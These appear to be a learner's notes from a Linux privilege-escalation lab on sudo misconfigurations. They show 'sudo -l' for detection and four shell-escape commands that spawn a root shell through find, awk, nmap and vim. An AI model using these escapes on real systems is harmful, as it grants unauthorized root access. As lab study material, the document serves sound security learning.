**Detection**﻿

Linux VM

1. In command prompt type: **sudo -l**

![[Pasted image 20240601213315.png]]


2. From the output, notice the list of programs that can run via sudo.

**Exploitation**

Linux VM

1. In command prompt type any of the following:

a. 
```
sudo find /bin -name nano -exec /bin/sh \;
```

![[Pasted image 20240601213550.png]]

b. 
```
sudo awk 'BEGIN {system("/bin/sh")}'
```

![[Pasted image 20240601213614.png]]

c. 
```
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
```

![[Pasted image 20240601213634.png]]

d. 
```
sudo vim -c '!sh'
```

![[Pasted image 20240601213654.png]]


Answer the questions below

Click 'Completed' once you have successfully elevated the machine
